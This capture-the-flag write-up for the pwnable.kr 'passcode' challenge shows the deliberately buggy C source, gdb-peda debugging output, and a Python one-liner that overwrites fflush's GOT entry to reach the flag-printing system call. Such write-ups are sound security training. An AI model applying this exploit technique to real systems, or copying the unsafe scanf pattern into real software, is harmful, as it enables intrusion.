# Pwnable.kr Passcode

Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)

# Files

```sh
passcode@ubuntu:~$ ls
flag  passcode	passcode.c
passcode@ubuntu:~$ cat passcode.c
```

# passcode.c
```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

# Generate CCCC based on the name[100] memory
Just to see what's going on in memory during the crash

```sh
python -c '"A"*96 + "C"*4'
```

# Find CCCC
See where CCCC is stored in memory

```sh
gdb-peda$ find CCCC
Searching for 'CCCC' in: None ranges
Found 3 results, display max 3 items:
 [heap] : 0x804b070 ("CCCC!\n")
 [heap] : 0x804b470 ("CCCC\n")
[stack] : 0xffffd2c8 ("CCCC")
```

# Check system address and fflush address

Check key addresses in order to determine GOT addresses

```sh
Dump of assembler code for function login:
=> 0x08048564 <+0>:	push   ebp
   0x08048565 <+1>:	mov    ebp,esp
   0x08048567 <+3>:	sub    esp,0x28
   0x0804856a <+6>:	mov    eax,0x8048770
   0x0804856f <+11>:	mov    DWORD PTR [esp],eax
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    eax,0x8048783
   0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:	mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:	mov    DWORD PTR [esp],eax
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    eax,ds:0x804a02c
   0x08048590 <+44>:	mov    DWORD PTR [esp],eax
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    eax,0x8048786
   0x0804859d <+57>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    eax,0x8048783
   0x080485aa <+70>:	mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad <+73>:	mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	mov    DWORD PTR [esp],0x80487bd
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	mov    DWORD PTR [esp],0x0
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
```

# Check memory after crash...

Check for CCCC after seg fault

```sh
gdb-peda$ find CCCC
Searching for 'CCCC' in: None ranges
Found 4 results, display max 4 items:
 [heap] : 0x804b070 ("CCCC!\n")
 [heap] : 0x804b470 ("CCCC\n")
[stack] : 0xffffd2b4 ("CCCC", 'A' <repeats 16 times>, "CCCC")
[stack] : 0xffffd2c8 ("CCCC")
gdb-peda$ 
```

Check the registers after crash
```sh
[----------------------------------registers-----------------------------------]
EAX: 0x804b470 ("CCCC\n")
EBX: 0x0 
ECX: 0x40 ('@')
EDX: 0x43434343 ('CCCC')
ESI: 0xffffffff 
EDI: 0xffffd2b8 ('A' <repeats 16 times>, "CCCC")
EBP: 0xffffd268 --> 0xffffd2a8 --> 0xffffd2d8 --> 0xffffd2f8 --> 0x0 
ESP: 0xffffcc80 --> 0xf7fac960 --> 0x0 
EIP: 0xf7e4d13a (<_IO_vfscanf+12874>:	mov    DWORD PTR [edx],eax)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e4d12f <_IO_vfscanf+12863>:	mov    edx,DWORD PTR [edi]
   0xf7e4d131 <_IO_vfscanf+12865>:	add    edi,0x4
   0xf7e4d134 <_IO_vfscanf+12868>:	mov    DWORD PTR [ebp-0x5a8],edi
=> 0xf7e4d13a <_IO_vfscanf+12874>:	mov    DWORD PTR [edx],eax
   0xf7e4d13c <_IO_vfscanf+12876>:	jmp    0xf7e4ad8f <_IO_vfscanf+3743>
   0xf7e4d141 <_IO_vfscanf+12881>:	mov    edi,DWORD PTR [ebp-0x5a8]
   0xf7e4d147 <_IO_vfscanf+12887>:	mov    edx,edi
   0xf7e4d149 <_IO_vfscanf+12889>:	add    edi,0x4
[------------------------------------stack-------------------------------------]
0000| 0xffffcc80 --> 0xf7fac960 --> 0x0 
0004| 0xffffcc84 --> 0x804b008 ("enter passcode1 : ", 'A' <repeats 86 times>, "CCCC!\n")
0008| 0xffffcc88 --> 0xf7fac300 --> 0x0 
0012| 0xffffcc8c --> 0xf7e635ea (mov    esi,eax)
0016| 0xffffcc90 --> 0xf7faed60 --> 0xfbad2a84 
0020| 0xffffcc94 --> 0x804b008 ("enter passcode1 : ", 'A' <repeats 86 times>, "CCCC!\n")
0024| 0xffffcc98 --> 0x6e ('n')
0028| 0xffffcc9c --> 0xffffffc0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xf7e4d13a in _IO_vfscanf () from /lib32/libc.so.6
gdb-peda$ 
```

# Key values
Check GOT entries using the addresses from the function dump

fflush = 0x8048430	# fflush address
system = 0x8048460	# system address
CCCC = 0x804b470 / EAX # CCCC address 

# Get GOT Address fflush
Find the address of the ffflush 
```sh
gdb-peda$ pdisass 0x8048430
Dump of assembler code from 0x8048430 to 0x8048450::	Dump of assembler code from 0x8048430 to 0x8048450:
   0x08048430 <fflush@plt+0>:	jmp    DWORD PTR ds:0x804a004
   0x08048436 <fflush@plt+6>:	push   0x8
   0x0804843b <fflush@plt+11>:	jmp    0x8048410
   0x08048440 <__stack_chk_fail@plt+0>:	jmp    DWORD PTR ds:0x804a008
   0x08048446 <__stack_chk_fail@plt+6>:	push   0x10
   0x0804844b <__stack_chk_fail@plt+11>:	jmp    0x8048410
End of assembler dump.
```

The GOT address based on the JMP pointer, the pointer for fflush GOT = 0x804a004.. The JMP address to replace is right before the system call, which is at 80485E3, in binary = 134514147

# Exploit
```sh
python -c 'import struct;import binascii;fflush = 0x804a004;system = "134514147";print "\x41"*96 + struct.pack("<I",fflush) + system'
```

# On live server...
```sh
passcode@ubuntu:~$ python -c 'import struct;import binascii;fflush = 0x804a004;system = "134514147";print "\x41"*96 + struct.pack("<I",fflush) + system' > /tmp/got
passcode@ubuntu:~$ gdb passcode
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from passcode...(no debugging symbols found)...done.
(gdb) run < /tmp/got
Starting program: /home/passcode/passcode < /tmp/got
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
/bin/cat: flag: Permission denied
enter passcode1 : Now I can safely trust you that you have credential :)
[Inferior 1 (process 19854) exited normally]
(gdb) 
```
